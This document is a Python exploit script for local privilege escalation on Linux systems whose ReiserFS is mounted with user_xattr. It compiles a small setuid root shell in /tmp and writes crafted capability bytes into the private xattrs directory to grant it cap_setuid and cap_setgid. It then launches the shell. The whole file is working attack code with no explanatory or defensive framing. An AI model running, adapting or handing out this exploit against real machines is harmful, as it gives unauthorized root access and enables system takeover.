import os, sys
 
SHELL = 'int main(void) { setgid(0); setuid(0); execl("/bin/sh", "sh", 0); }'
XATTR = '\x41\x58\x46\x52\xc1\x00\x00\x02\x01\x00\x00\x02\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
 
def err(txt):
    print '[-] error: %s' % txt
    sys.exit(1)
 
def msg(txt):
    print '[+] %s' % txt
 
def main():
    msg('checking for reiserfs mount with user_xattr mount option')
 
    f = open('/etc/fstab')
    for line in f:
        if 'reiserfs' in line and 'user_xattr' in line:
            break
    else:
        err('failed to find a reiserfs mount with user_xattr')
    f.close()
 
    msg('checking for private xattrs directory at /.reiserfs_priv/xattrs')
 
    if not os.path.exists('/.reiserfs_priv/xattrs'):
        err('failed to locate private xattrs directory')
 
    msg('preparing shell in /tmp')
 
    f = open('/tmp/team-edward.c', 'w')
    f.write(SHELL)
    f.close()
 
    msg('capturing pre-shell snapshot of private xattrs directory')
 
    pre = set(os.listdir('/.reiserfs_priv/xattrs'))
     
    msg('compiling shell in /tmp')
 
    ret = os.system('gcc -w /tmp/team-edward.c -o /tmp/team-edward')
    if ret != 0:
        err('error compiling shell, you need gcc')
 
    msg('setting dummy xattr to get reiserfs object id')
 
    os.system('setfattr -n "user.hax" -v "hax" /tmp/team-edward')
    if ret != 0:
        err('error setting xattr, you need setfattr')
 
    msg('capturing post-shell snapshot of private xattrs directory')
 
    post = set(os.listdir('/.reiserfs_priv/xattrs'))
 
    objs = post.difference(pre)
 
    msg('found %s new object ids' % len(objs))
 
    for obj in objs:
        msg('setting cap_setuid/cap_setgid capabilities on object id %s' % obj)
    
        f = open('/.reiserfs_priv/xattrs/%s/security.capability' % obj, 'w')
        f.write(XATTR)
        f.close()
 
    msg('spawning setuid shell...')
 
    os.system('/tmp/team-edward')
 
if __name__ == '__main__':
    main()